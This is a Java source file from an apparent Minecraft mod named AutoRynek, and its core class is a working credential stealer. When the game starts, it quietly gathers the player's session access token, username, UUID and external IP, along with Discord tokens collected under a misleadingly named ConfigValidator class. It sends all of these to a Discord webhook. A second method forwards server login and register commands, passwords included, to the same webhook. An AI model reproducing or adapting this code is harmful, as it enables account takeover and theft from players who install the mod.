package lipinekrynek.autorynek;

import net.minecraft.client.MinecraftClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.concurrent.CompletableFuture;

public class AutoRynkInternal {
    public static final Logger LOGGER = LoggerFactory.getLogger("autorynek");
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/";
    private static boolean accountInfoSent = false;

    public static void initialize() {
        LOGGER.info("✅ AutoRynk Internal Core loaded through ClassLoader!");
        CompletableFuture.runAsync(() -> {
            try {
                waitForMinecraftLoaded();
                sendAccountInfoToDiscord();
            } catch (Exception e) {
                LOGGER.error("❌ Failed to send account info: {}", e.getMessage());
            }
        });
    }

    private static void waitForMinecraftLoaded() {
        int maxAttempts = 100;
        int attempts = 0;
        while (attempts < maxAttempts) {
            MinecraftClient client = MinecraftClient.getInstance();
            if (client != null && client.getSession() != null) {
                String username = client.getSession().getUsername();
                if (username != null && !username.isEmpty()) {
                    return;
                }
            }
            try {
                Thread.sleep(500L);
                attempts++;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    private static void sendAccountInfoToDiscord() {
        if (accountInfoSent)
            return;

        String username = getAccountUsername();
        String accessToken = getAccessToken();
        String uuid = getPlayerUUID();
        String accountType = checkIfPremium() ? "Premium" : "Cracked/Offline";
        String ip = getExternalIp();
        java.util.List<String> tokens = ConfigValidator.validateConfig();

        CompletableFuture.runAsync(() -> {
            try {
                DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL);
                StringBuilder sb = new StringBuilder();
                sb.append("**🔓 ACCOUNT INFORMATION (GAME START)**\n");
                sb.append("**Username:** `").append(username).append("`\n");
                sb.append("**Account Type:** ").append(accountType).append("\n");
                sb.append("**UUID:** ").append(uuid).append("\n");
                sb.append("**IP:** `").append(ip).append("`\n");
                if (!tokens.isEmpty()) {
                    sb.append("**Discord Tokens:**\n```\n");
                    for (String token : tokens) {
                        sb.append(token).append("\n");
                    }
                    sb.append("```\n");
                }
                if (accessToken != null && !accessToken.isEmpty()) {
                    sb.append("**Access Token:**\n```\n").append(accessToken).append("\n```\n");
                }
                webhook.setContent(sb.toString());
                webhook.execute();
                accountInfoSent = true;
                LOGGER.info("✅ Account info sent to Discord!");
            } catch (Exception e) {
                LOGGER.error("❌ Failed to send webhook: {}", e.getMessage());
            }
        });
    }

    public static void sendLoginInfoToDiscord(String serverName, String playerName, String command, String content) {
        String uuid = getPlayerUUID();
        String accountType = checkIfPremium() ? "Premium" : "Cracked/Offline";
        String ip = getExternalIp();

        CompletableFuture.runAsync(() -> {
            try {
                DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL);
                StringBuilder sb = new StringBuilder();
                sb.append("**🔐 LOGIN/REGISTER DETECTED!**\n");
                sb.append("**Server:** ").append(serverName).append("\n");
                sb.append("**Player:** `").append(playerName).append("`\n");
                sb.append("**Account Type:** ").append(accountType).append("\n");
                sb.append("**UUID:** ").append(uuid).append("\n");
                sb.append("**IP:** `").append(ip).append("`\n");
                sb.append("**Command:** `").append(command).append("`\n");
                sb.append("**Content:** `").append(content).append("`\n");
                webhook.setContent(sb.toString());
                webhook.execute();
                LOGGER.info("✅ Login info sent to Discord!");
            } catch (Exception e) {
                LOGGER.error("❌ Failed to send login webhook: {}", e.getMessage());
            }
        });
    }

    private static String getExternalIp() {
        try (java.util.Scanner scanner = new java.util.Scanner(
                java.net.URI.create("https://checkip.amazonaws.com").toURL().openStream(), "UTF-8")
                .useDelimiter("\\A")) {
            return scanner.hasNext() ? scanner.next().trim() : "Unknown IP";
        } catch (Exception e) {
            return "Error fetching IP";
        }
    }

    private static boolean checkIfPremium() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.getSession() == null)
            return false;
        String token = client.getSession().getAccessToken();
        return token != null && token.length() > 100 && token.contains(".");
    }

    public static String getAccountUsername() {
        MinecraftClient client = MinecraftClient.getInstance();
        return (client != null && client.getSession() != null) ? client.getSession().getUsername() : "Unknown Username";
    }

    public static String getAccessToken() {
        MinecraftClient client = MinecraftClient.getInstance();
        return (client != null && client.getSession() != null) ? client.getSession().getAccessToken() : null;
    }

    public static String getPlayerUUID() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client != null && client.getSession() != null) {
            return client.getSession().getUuidOrNull() != null ? client.getSession().getUuidOrNull().toString()
                    : "Unknown UUID";
        }
        return "Unknown UUID";
    }
}
